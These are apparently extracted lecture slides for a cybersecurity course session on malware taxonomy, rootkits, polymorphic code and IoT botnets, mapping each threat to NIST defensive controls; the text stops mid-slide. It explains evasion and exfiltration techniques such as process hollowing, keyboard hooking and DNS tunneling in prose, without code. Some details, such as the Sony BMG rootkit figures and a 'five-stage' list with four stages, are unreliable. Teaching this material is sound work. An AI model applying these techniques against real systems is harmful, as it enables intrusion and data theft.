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to Class 16, "Malware and Device Attacks." Today, we transition our focus from network-level security and protocol defenses to host-level security. We will dissect the software engineered to compromise the endpoint itself: malware. While firewalls, intrusion detection systems, and network segmentation act as external perimeter controls, they are ultimately designed to prevent an adversary from reaching the host. Once an adversary bypasses these layers, the endpoint becomes the primary battleground.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>In this lecture, we will study the taxonomy of malicious software, including viruses, worms, trojans, ransomware, and spyware, with academic and theoretical rigor. We will reference international standards, specifically NIST Special Publication 800-83 Rev. 1 (Guide to Malware Incident Prevention and Handling), to understand how malware is classified, analyzed, and mitigated. We will also examine how the explosive growth of the Internet of Things (IoT) has dramatically expanded the digital attack surface, creating low-resource targets that are easily recruited into distributed botnets.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The history of malicious software explains the sophistication of modern threats. The first recognized self-replicating computer program, the Creeper virus, appeared on the ARPANET in 1971. It was followed by the first true computer virus, Elk Cloner, which infected Apple II boot sectors in 1982. By 1988, the Morris Worm had demonstrated that network-propagating malware could cause catastrophic availability failures, infecting thousands of UNIX systems and causing millions of dollars in damage. Since then, malware has evolved from curiosity-driven experiments into a trillion-dollar global criminal enterprise, encompassing organized ransomware syndicates, nation-state espionage tools, and commercial spyware platforms.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The economic impact of malware is staggering. According to Cybersecurity Ventures, global cybercrime costs, largely driven by malware, exceeded $8 trillion USD in 2023. High-profile incidents such as the WannaCry ransomware attack (2017) disrupted the UK National Health Service, disabled manufacturing lines at Renault, and caused an estimated $4–8 billion in global damages in a single weekend. These examples underscore why understanding malware taxonomy is not merely academic, it is a professional imperative for every cybersecurity practitioner.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Today's lecture will establish the formal classification framework, walk through the mechanics of each malware class, and analyze defensive controls mapped to those mechanics. By the end of this session, you will be able to distinguish the propagation vectors, trigger conditions, and payload objectives of each major malware class, and explain which NIST SP 800-53 controls are most effective against them.</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study malware scientifically, we must move beyond colloquial definitions and establish a formal taxonomy. NIST SP 800-83 Rev. 1 provides a standardized framework, defining malware based on its intent to compromise one or more pillars of the CIA triad. Rather than viewing malware as a single monolithic category, cybersecurity researchers classify it by three distinct operational attributes: the propagation vector, the trigger, and the payload.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The propagation vector defines the delivery mechanism. This determines whether the malware requires human assistance, rides piggyback on legitimate files, or exploits protocol-level software bugs to replicate. The propagation vector is arguably the most important parameter from a defensive standpoint, because it determines which network and host controls will be effective at stopping the malware before it reaches its target system.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The execution trigger represents the transitional logic from a dormant state to an active state. This can be time-based, such as a logic bomb waiting for a specific calendar date or system time, or event-based, requiring user actions like opening a file, inserting removable media, or connecting to a specific network resource. Advanced persistent threats (APTs) often include complex multi-condition triggers designed to avoid detonating during analysis in a sandboxed environment, for example, checking whether the mouse cursor has moved before executing the payload to defeat automated analysis systems.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Finally, the payload is the actual damage mechanism, the code that performs file encryption, logs keystrokes, or communicates with a command-and-control server. The payload is the most visible component of malware, but it is the last component to execute. Understanding the propagation vector and trigger is essential for prevention; understanding the payload is essential for damage assessment and forensic investigation.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Modern malware does not conform neatly to a single category. Advanced malware is modular and polymorphic, frequently combining multiple malware behaviors in a single package. For example, the Emotet malware family began as a banking Trojan, evolved to include worm-like propagation capabilities, and was later used as a dropper platform to deliver ransomware payloads. The MITRE ATT&amp;CK framework (https://attack.mitre.org/) provides a comprehensive matrix of the tactics, techniques, and procedures (TTPs) that sophisticated malware uses throughout the attack lifecycle, from initial access through impact, and is the industry standard reference for threat modeling and detection engineering.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Understanding this taxonomy allows security architects to select defensive controls with precision. Signature-based antivirus tools are effective against known payload hashes but completely ineffective against polymorphic variants. Network-level controls block propagation vectors but cannot prevent execution triggered by removable media. Only by understanding all three taxonomic parameters can we design a defense-in-depth architecture that addresses each phase of the malware lifecycle.</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computer virus is structurally defined by its dependency on a host carrier and human action to propagate. Unlike network worms, a virus cannot move across a network autonomously. It must attach itself to a legitimate file, script, or system sector. When the infected carrier is shared, via email attachment, USB drive, shared network drive, or downloaded from a website, and then executed by another user, the virus activates and spreads.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The mechanics of file infection vary by binary format. On Windows systems, viruses typically target Portable Executable (PE) files, the format used by .exe and .dll binaries. A prepending virus inserts its malicious code at the beginning of the file and modifies the PE header's entry point address to execute the malicious routine before the legitimate code. An appending virus adds code to the end of the binary and similarly rewrites the entry point. A cavity virus, also known as a space-filler virus, writes itself into empty space within the binary's sections (areas padded with null bytes), avoiding any change to the file's total size, a technique that defeats basic file-size integrity checks.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>To bypass modern endpoint defenses, viruses use evasion techniques refined over decades. Polymorphic viruses encrypt their payload with a variable encryption key and generate a new decryption stub (routine) for each infection. While the decryption stub changes with every copy, the functional payload remains the same. Because the binary's byte pattern is different every time, signature-based detection systems cannot match it against a static hash or pattern. Metamorphic viruses go further, they include a rewriting engine that transforms the actual code body using semantic-preserving techniques such as instruction substitution (replacing ADD AX, 1 with INC AX), register reassignment, dead code insertion, and code block permutation. This ensures that no two infected copies share any common byte sequence, making signature detection effectively impossible.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Historical examples illustrate the real-world impact of virus propagation. The Melissa virus (1999), spread via Word macro attachments, was one of the first to demonstrate mass-email propagation and caused an estimated $80 million in damages. The CIH (Chernobyl) virus (1998) was particularly destructive, overwriting the system BIOS on infected machines, causing permanent hardware damage. These historical examples emphasize why patching email gateway filters, enforcing software execution policies, and implementing file integrity monitoring (NIST SP 800-53 SI-7) are essential defensive controls.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Defenses against viruses must operate at multiple layers: email gateways that scan attachments before delivery, endpoint antivirus with both signature and behavioral detection modules, application whitelisting to prevent execution of unsigned binaries, and user education to prevent social engineering that tricks users into executing infected files. Understanding the virus lifecycle allows security teams to place defenses at the exact stages where intervention is possible.</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If a virus is a passenger that needs a vehicle, a network worm is an autonomous vehicle. A worm is a self-contained program that replicates over network connections without requiring any host file or human interaction. This fundamental distinction, autonomous propagation, is what makes worms so extraordinarily dangerous. A virus can spread as quickly as users share files; a worm spreads as fast as the network can carry packets.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Worms typically execute a multi-phase propagation loop, as illustrated in the diagram above. The scanning module generates pseudo-random IP addresses and sends connection probes to check for specific open ports. For example, the WannaCry worm scanned for open TCP port 445, which is used by the Server Message Block (SMB) protocol for Windows file sharing. When a vulnerable host is identified, the worm dispatches a crafted exploit payload. The EternalBlue exploit used by WannaCry targeted a memory corruption vulnerability (CVE-2017-0144) in Windows SMBv1, allowing the worm to write arbitrary code directly into the kernel's memory space and gain SYSTEM-level privileges without any user interaction whatsoever.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Once remote code execution is achieved, a shellcode payload executes on the victim machine. Shellcode is compact, position-independent machine code that performs a minimal bootstrap function, typically instructing the compromised operating system to download the complete worm binary from the attacking host or a remote staging server. This secondary download establishes the new infection node, which immediately begins its own subnet scanning loop. The mathematical result is exponential growth: one host infects two, those two infect four, and within hours, millions of hosts can be compromised.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Historical case studies demonstrate this explosive propagation. The Morris Worm (1988) infected an estimated 6,000 machines, roughly 10% of the entire Internet at the time, within 24 hours, causing the first major Internet availability crisis. Code Red (2001) infected over 359,000 hosts within 14 hours and generated massive denial-of-service traffic. Conficker (2008) infected an estimated 9–15 million machines globally. WannaCry (2017), which exploited the EternalBlue vulnerability, infected over 230,000 systems in 150 countries in a single day, disabling hospital systems, railway networks, and telecommunications infrastructure.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Defending against worms requires controls that operate at the network layer before they reach a host. NIST SP 800-53 SC-7 (Boundary Protection) calls for network segmentation to limit lateral movement across VLANs and subnets. NIST SP 800-53 RA-5 (Vulnerability Scanning) and SI-2 (Flaw Remediation) demand that organizations maintain rapid patch cycles to close the windows that worm exploits rely on. Intrusion Prevention Systems (IPS) can detect and block worm scanning traffic patterns. The key lesson from every major worm outbreak is that the time between public vulnerability disclosure and widespread worm exploitation is shrinking, organizations must be capable of patching critical vulnerabilities within days, not weeks.</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Named after the ancient Greek myth, a Trojan Horse relies on deception rather than technical network exploits to gain initial access. Because Trojans do not self-replicate, they must persuade the user to execute them voluntarily. This makes user trust the primary vulnerability, not a software bug in a network protocol. Threat actors invest significant effort in making Trojan carriers appear legitimate, mimicking the visual design of real software installers, digitally signing binaries with stolen code-signing certificates, and distributing them through legitimate-looking websites or typosquatted domains.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The mechanics of Trojan delivery rely on "binding" or "wrapping" techniques. A binder utility merges a benign application (such as a PDF reader installer, a game, or a system utility) with a malicious payload into a single combined executable. When the user runs the installer, the legitimate application launches in the foreground, maintaining the illusion of a normal installation, while the malicious component silently writes itself to the file system, establishes registry persistence, and initiates a network connection to the attacker's infrastructure. The user sees the expected program working correctly and has no indication of compromise.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>More sophisticated delivery methods use process hollowing, a technique that targets legitimate system processes to evade endpoint security. In process hollowing, the malware launches a legitimate Windows process, such as svchost.exe, explorer.exe, or lsass.exe, in a suspended state. Before the process fully initializes, the malware uses Windows API calls to unmap (hollow out) the legitimate code from the process's memory space and replace it with the malicious payload. The malicious code then executes with the identity and trust of the legitimate process, making it extremely difficult for host-based security products to distinguish malicious behavior from normal system activity.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Once executed, a Trojan establishes a Command-and-Control (C2) channel. Modern C2 architectures use outbound encrypted connections (HTTPS on port 443 or DNS queries on port 53) to "phone home" to attacker-controlled servers or domain fronting infrastructure behind major Content Delivery Networks (CDNs). This outbound-initiated traffic structure bypasses traditional inbound-blocking firewalls. The C2 channel provides the attacker with a persistent interactive backdoor (Remote Access Trojan / RAT), allowing them to browse the file system, capture keystrokes, exfiltrate documents, activate the webcam, and pivot to other internal hosts.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Defending against Trojans requires a layered approach: email and web gateway filtering to block malicious downloads, application allowlisting to prevent unsigned binaries from executing, user security awareness training to recognize suspicious software sources, and behavioral endpoint detection to identify anomalous C2 beacon patterns. The MITRE ATT&amp;CK technique T1055 (Process Injection) and T1059 (Command and Scripting Interpreter) describe the post-execution behaviors of Trojans, providing detection opportunities even when the initial delivery bypasses signature-based controls.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Ransomware has evolved into one of the most financially destructive malware threats in history, transitioning from simple locker utilities that restricted access to the user interface into sophisticated cryptographic extortion platforms run by organized criminal enterprises. Early ransomware variants, such as the AIDS Trojan (1989), which was distributed on floppy disks at a World Health Organization conference, used simple symmetric encryption or screen-locking to demand payment. Modern ransomware families, such as LockBit 3.0, BlackCat/ALPHV, and Cl0p, operate as Ransomware-as-a-Service (RaaS) businesses, providing ready-built ransomware toolkits and infrastructure to affiliate operators in exchange for a percentage of ransom payments.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The hybrid cryptographic model that modern ransomware uses is elegant in its efficiency. Asymmetric encryption algorithms like RSA-2048 are computationally expensive and far too slow to encrypt gigabytes of data within the time window available before endpoint detection systems flag the activity. Symmetric algorithms like AES-256 or ChaCha20, by contrast, can encrypt data at speeds exceeding 1 gigabyte per second on modern hardware. Ransomware exploits both: it uses the fast symmetric algorithm to encrypt the actual file data, and the slow asymmetric algorithm only for the single, small task of protecting the symmetric key. The result is that an attacker can lock thousands of files in seconds while ensuring that the key protecting all that data can only be recovered by someone who possesses the corresponding RSA private key, stored securely on the attacker's server.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The five-stage encryption process works as follows. First, the ransomware generates a cryptographically random AES-256 session key in memory. This key is unique per victim (and sometimes unique per file) to prevent decryptors from working across multiple victims. Second, the ransomware's file system scanning thread walks through local drives and mapped network shares, filtering files by extension (targeting high-value document types while skipping system files needed to keep the operating system functional, so the ransom note can still be displayed). Third, each matching file is encrypted using AES-256-CBC or AES-256-GCM, and the original plaintext file is deleted. Fourth, the session key itself is encrypted using the attacker's embedded RSA-2048 or Elliptic Curve public key, and the encrypted key blob is appended to each encrypted file. The original plaintext session key is then zeroed out from memory, making recovery without the RSA private key mathematically impossible with current computing technology.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Modern ransomware groups have further escalated pressure through "double extortion" and "triple extortion" tactics. In double extortion, the malware exfiltrates a copy of sensitive data to the attacker's servers before beginning encryption, allowing the attacker to threaten public release of confidential business data, customer records, or intellectual property if the ransom is not paid, even if the victim restores from backups. Triple extortion adds DDoS attacks against the victim's public services to amplify financial and reputational pressure.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The primary defense against ransomware is an immutable, offline backup strategy (NIST SP 800-53 CP-9). Backups that cannot be encrypted by the ransomware process, stored in an air-gapped location or using a WORM (Write Once, Read Many) storage architecture, allow organizations to restore systems without paying. The FBI, CISA, and global law enforcement agencies universally advise against paying ransoms, as payment does not guarantee data recovery and funds further criminal operations.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While ransomware wants to be noticed immediately to demand payment, spyware must remain silent and invisible for extended periods, sometimes months or years, to maximize the volume and value of stolen information. Its primary objective is the covert, long-term compromise of confidentiality. Spyware monitors keyboard inputs, active processes, local files, clipboard contents, and hardware peripherals (webcams, microphones) to harvest credentials, financial data, proprietary intellectual property, and personal identifying information.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The operating system architecture determines where spyware chooses to intercept data. At the lowest interception layer, kernel-mode keyloggers install as device drivers that receive hardware interrupt notifications from the keyboard controller before any application-layer process sees the keystrokes. This makes them extremely difficult to detect because they operate below the visibility of most security software. User-mode keyloggers use Windows API hooks, specifically the SetWindowsHookEx function with the WH_KEYBOARD_LL hook type, to register a callback that receives every keypress before the target application does. Because this API hook is a legitimate operating system feature, basic behavioral detection must rely on context: a keylogger hook installed by a PDF reader process is anomalous; one installed by the Input Method Editor (IME) is expected.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Form grabbing represents a more sophisticated interception technique. Because operating system-level keyloggers capture raw keystrokes, they cannot easily distinguish which application a keystroke was sent to. Form grabbers solve this by injecting a malicious DLL directly into the web browser's process space. By hooking the browser's internal form-submission functions, the injected code can steal the complete username, password, and any other form fields in cleartext at the moment the user clicks "Submit", before the browser encrypts the data using TLS. This technique was famously used by the Zeus banking Trojan family, which caused an estimated $3 billion in global financial losses.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>To exfiltrate captured data without triggering network security alerts, spyware uses covert communication channels. DNS tunneling exploits the near-universal allowance of outbound DNS traffic: the spyware encodes stolen data as base64 or hexadecimal strings within DNS subdomain queries directed at an attacker-controlled authoritative DNS server. Each query appears to be a legitimate DNS resolution request, but the subdomain label carries encoded data payload. The attacker's DNS server decodes the incoming queries, reassembling the stolen data stream. Because most organizations do not perform deep inspection of DNS query content, this channel effectively bypasses perimeter security controls.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Detecting spyware requires behavioral analysis and outbound traffic inspection. Security teams should monitor for processes installing keyboard or global hooks (SetWindowsHookEx calls from non-system processes), DLL injection into browser processes (Sysmon Event ID 7 for image loads), and anomalous DNS query patterns, particularly high-frequency queries to domains with unusually long or randomized subdomain labels. DNS-layer security filtering tools (such as Cisco Umbrella or Cloudflare Gateway) can inspect DNS traffic and block known DNS tunneling patterns, closing this covert channel.</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comparative matrix outlines the technical profiles of the primary malware classes and maps them to appropriate NIST SP 800-53 defensive controls. To design an effective security architecture, organizations must understand that no single defensive technology addresses all malware classes, each threat type has distinct characteristics that demand targeted controls.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>For viruses, which require file execution to propagate, the primary controls are Host-Based File Integrity Monitoring (NIST SP 800-53 SI-7) and endpoint antivirus with both signature and behavioral detection engines. File integrity monitoring tools, such as Tripwire or the Linux aide utility, maintain cryptographic hashes of critical system files and alert when unauthorized modifications occur. However, these tools are reactive; they detect infection after it has occurred. Proactive controls include email and web gateway scanning to prevent infected files from reaching the host.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>For worms, which propagate autonomously through network vulnerability exploitation, the critical controls are network segmentation (SC-7) to limit blast radius, and rapid vulnerability patching (SI-2, RA-5) to close the exploitable software flaws before they are weaponized. The key lesson from WannaCry is that Microsoft had released a patch (MS17-010) for the EternalBlue vulnerability 59 days before the WannaCry attack, organizations that had applied this patch were not infected. Automated patch management and strict network access controls between business segments dramatically limit worm propagation.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>For Trojans, which bypass network perimeters through social engineering, the most effective controls are application allowlisting (CM-7), which prevents unauthorized executables from running regardless of how they arrived on the system, combined with the Principle of Least Privilege (AC-6), which limits the damage an attacker can inflict even with a running Trojan by restricting the account's access to sensitive resources and administrative functions.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>For ransomware, the ultimate control is backup resilience (CP-9). An immutable, geographically distributed, regularly tested backup strategy ensures the organization can recover without paying a ransom, eliminating the attacker's leverage. Endpoint Detection and Response (EDR) tools can also detect ransomware behavior, specifically, the rapid creation of encrypted file copies and deletion of originals, and terminate the process before it completes its encryption run.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>For spyware, outbound traffic analysis is the primary detective control. Behavioral endpoint monitoring (SI-4) can identify processes making anomalous API hook registrations or injecting into browser processes, while outbound DNS filtering can detect DNS tunneling exfiltration channels. The combination of these controls with network flow monitoring allows security teams to identify spyware operations even when the malware successfully evades signature-based detection.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The overarching principle illustrated by this matrix is defense-in-depth: layering controls across the propagation, execution, and payload phases ensures that even when one control layer fails, others remain to detect, limit, or recover from a malware incident.</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Internet of Things (IoT) represents the most significant expansion of the global attack surface since the commercialization of the internet. According to IoT Analytics, over 15 billion IoT devices were connected to the internet by 2023, with projections exceeding 27 billion by 2025. These devices span an enormous range: consumer products like smart cameras, smart speakers, and home routers; industrial sensors and programmable logic controllers (PLCs) in manufacturing and critical infrastructure; medical devices like infusion pumps and patient monitors in hospitals; and municipal infrastructure like traffic control systems and smart meters. The common thread is that these devices are deployed, often by non-technical staff, without security oversight.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The hardware constraints of IoT devices create a perfect storm of vulnerability. These devices are optimized for low cost and minimal power consumption, which limits them to low-end microcontrollers or minimal single-board computers with limited CPU performance and memory, typically 32–256 MB of RAM. This is insufficient to host standard endpoint security agents like EDR software. Security features like secure boot, firmware signing, and hardware security modules are frequently omitted to reduce bill-of-materials costs. Most devices run a stripped-down, customized Linux distribution based on an outdated kernel, often years behind the current security patch level, because manufacturers rarely issue firmware updates, and the update process is complex enough that most consumers never apply them even when they are available.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The OWASP IoT Top 10 (2018) identifies the most critical IoT vulnerability categories, with hardcoded credentials ranked first. Manufacturers ship devices with default administrative usernames and passwords, such as admin/admin, root/toor, or device-specific defaults documented in publicly available product manuals, that cannot always be changed or that consumers routinely leave in place. This single vulnerability enabled the creation of the Mirai botnet.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Mirai, first discovered in 2016, weaponized these vulnerabilities at unprecedented scale. Its infection loop was brutally simple: scan the internet for open Telnet ports (TCP 23 and 2323), attempt to authenticate using a hardcoded list of 64 manufacturer default credential pairs, and if successful, inject a shell command to download and execute the Mirai binary. Once infected, the device kills other competing processes and malware (to preserve system resources), closes the Telnet port (to prevent re-infection by competing botnet operators), and registers with a Command-and-Control server. The C2 server coordinates these hundreds of thousands of infected devices to launch coordinated DDoS attacks.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>On October 21, 2016, Mirai was used to launch a massive DNS amplification DDoS attack against Dyn, a major DNS infrastructure provider. The attack generated an estimated 1.2 terabits per second of traffic, temporarily knocking major internet services, including Twitter, Amazon, Netflix, Reddit, Spotify, and GitHub, offline for much of the eastern United States and Europe. This attack demonstrated that vulnerable consumer IoT devices could be weaponized to threaten global internet availability. The Mirai source code was subsequently released publicly, spawning dozens of derivative botnets that continue to operate today.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The primary defenses against IoT compromise require industry and regulatory action as well as individual consumer awareness: mandatory unique device credentials (eliminating shared default passwords), automated firmware update mechanisms, network segmentation (placing IoT devices on isolated VLANs with no access to critical business systems), and IoT-specific threat detection systems that can identify Mirai scanning patterns through network flow monitoring.</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summarize Class 16, malware is a diverse and evolving family of software payloads, each engineered to execute unauthorized actions on host systems. The key insight of this lecture is that modern malware cannot be addressed by any single defensive technology. Signature-based antivirus, while a necessary baseline control, is entirely inadequate against polymorphic and metamorphic variants that change their binary signature with every infection. Network firewalls that block inbound threats are ineffective against Trojans that establish outbound C2 connections. Secure backups address ransomware's payload impact but provide no protection against the data exfiltration used in double-extortion schemes.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Defending against host-level attacks requires a defense-in-depth architecture, as defined in NIST SP 800-53 and elaborated in the NIST Cybersecurity Framework (CSF). This means deploying controls across all five CSF functions, Identify, Protect, Detect, Respond, and Recover, with specific technical controls mapped to each malware class:</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>At the network layer, controls such as segmentation, ingress/egress filtering, DNS security, and network-level intrusion prevention systems address worm propagation and spyware exfiltration channels. At the host layer, controls including patch management, application allowlisting, endpoint detection and response (EDR) with behavioral analytics, and principle of least privilege address virus infection, Trojan execution, and unauthorized persistence. At the data layer, immutable offline backups and data classification policies address ransomware's availability impact and spyware's confidentiality impact. At the user layer, security awareness training reduces social engineering success rates that enable Trojan delivery. Finally, continuous monitoring and incident response plans ensure that when a malware incident does occur, the organization can detect, contain, and recover from it with minimal damage.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The exponential growth of the IoT ecosystem adds an additional dimension: billions of low-security endpoints that cannot be protected by conventional agent-based controls require network-level isolation and IoT-specific threat intelligence. This underscores the principle that every connected device expands the organizational attack surface, and must be accounted for in the security architecture.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>In our next session, Class 17, we will explore how to apply these concepts to end-user devices and servers through the structured process of device hardening, systematically closing the configuration weaknesses and vulnerable service exposures that malware relies on to gain and maintain initial access.</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rootkit represents one of the most technically sophisticated categories of malware because its primary objective is not data theft or file encryption, it is invisibility. The term "rootkit" originated in the Unix world, combining "root" (the Unix superuser account equivalent to Windows SYSTEM) and "kit" (a collection of tools). Early rootkits were collections of Trojanized Unix utilities, ls, ps, netstat, that replaced system binaries with modified versions that filtered out the attacker's files and processes from their output. Modern rootkits use far more sophisticated techniques to achieve the same goal.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>User-mode rootkits operate entirely within the application layer of the operating system and are the most easily detected class. They work by modifying the behavior of shared library functions (DLLs on Windows, shared objects on Linux) that legitimate security tools use to enumerate files, processes, and network connections. On Windows, for example, a user-mode rootkit might hook the NtQueryDirectoryFile Native API function, which underlies every directory listing operation, including File Explorer, to intercept its results and filter out entries belonging to the rootkit's files before returning them to the calling application. The attacker's files exist on disk in plain sight, but every API call that would reveal them is intercepted and censored.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Kernel-mode rootkits operate at the OS kernel level and are substantially harder to detect and remove. The most powerful technique is Direct Kernel Object Manipulation (DKOM), which exploits the fact that the Windows kernel tracks all running processes in a doubly-linked list data structure called the EPROCESS list. By directly modifying the kernel's memory to unlink the attacker's process from this list, DKOM renders the process completely invisible to any security tool that enumerates processes through standard APIs, including Task Manager, Process Explorer, and EDR agents. The process continues to execute normally, consuming CPU and memory and making network connections, but it simply does not appear in any process enumeration. DKOM was used by the Sony BMG rootkit (2005), perhaps the most notorious commercial rootkit incident, which was distributed on audio CDs and installed on over 22 million computers.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Bootkits represent the most persistent rootkit variant. By infecting the Master Boot Record (MBR) or, on modern UEFI systems, the EFI System Partition, a bootkit ensures that the malicious code executes before the operating system kernel loads. This means the rootkit can patch the kernel in memory as it starts, before any security software has a chance to initialize. Even a complete OS reinstallation does not remove a bootkit that has infected the MBR, because the OS installer does not necessarily rewrite the MBR. The Necurs botnet used a bootkit component to achieve persistence that survived Windows reinstalls. Removal requires specialized bootable forensics tools or, in severe cases, disk repartitioning.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>NIST SP 800-53 SI-6 (Security Function Verification) and SI-7 (Software, Firmware, and Information Integrity) mandate controls that support rootkit detection. Secure Boot (enabled in UEFI firmware) uses a cryptographic chain of trust to verify that each component loaded at boot, the bootloader, kernel, and kernel modules, is digitally signed by a trusted authority. Unauthorized modifications break the cryptographic signature chain, preventing the system from booting and alerting administrators. Kernel integrity mechanisms (such as Windows Kernel Patch Protection, also known as PatchGuard) detect and block unauthorized modifications to kernel data structures like the SSDT, providing real-time protection against kernel-mode rootkit installation.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>A rootkit that hides a process by directly manipulating kernel data structures (DKOM) still consumes CPU and memory, so the process appears in low-level resource monitoring while being absent from the normal process list. That discrepancy between resource use and process listing is a classic rootkit detection signature.</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signature-based detection model that dominated antivirus software for the first two decades of the field rests on a simple assumption: every copy of a given malware specimen shares a unique, stable byte pattern, a "signature", that the AV engine can identify in a scanned file. The virus writer's response to signature detection was to eliminate stable byte patterns through code mutation, spawning two distinct technical approaches: polymorphism and metamorphism.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Polymorphic malware was the first response to signature-based AV. A polymorphic engine appends an encryption layer around the malware's functional payload code. Each time the malware replicates, it generates a fresh random encryption key and encrypts the payload under it, producing a different byte pattern for the payload in every copy. The decryption stub, the small piece of code that decrypts the payload at runtime, also changes its structure slightly between copies (for example, swapping register usage or reordering independent instructions). The result is that no two copies share the same byte sequence for either the payload or the stub. Signature scanners cannot match any specific pattern because no pattern is stable.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>However, polymorphic malware does have an Achilles' heel: the decryption process itself. When a polymorphic sample executes, it must decrypt its payload before the payload can run. This means that at some point, the malware's complete, unencrypted code body appears in memory. Generic emulation-based scanners can detect this by "executing" the binary in a lightweight emulator, watching the decryption stub run, and then scanning the revealed payload code. The emulator approach introduced the "decrypt-and-scan" detection technique, which successfully identifies polymorphic malware that simple signature matching cannot.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Metamorphic malware was developed to defeat emulator-based detection. A metamorphic engine contains a sophisticated code transformation module, sometimes thousands of lines of code, that restructures the malware's entire functional code body with each replication. This transformation uses semantic-preserving substitutions: operations that change the assembly-language representation of the code while preserving its logical function. Common transformations include instruction substitution (replacing one operation with an equivalent sequence, such as XOR EAX, EAX instead of MOV EAX, 0), register reassignment (using a different CPU register to hold the same value), dead code insertion (adding no-operation instructions or calculations whose results are never used), code transposition (reordering independent code blocks), and subroutine inlining or outlining.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The W32/Simile virus (also known as Etap), discovered in 2002, is considered the most complex metamorphic virus ever analyzed. Its metamorphic engine comprised over 14,000 lines of assembly code, making the mutation engine itself larger than most viruses of its era. Each new copy of Simile was structurally different from all previous copies, sharing no stable byte sequences.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
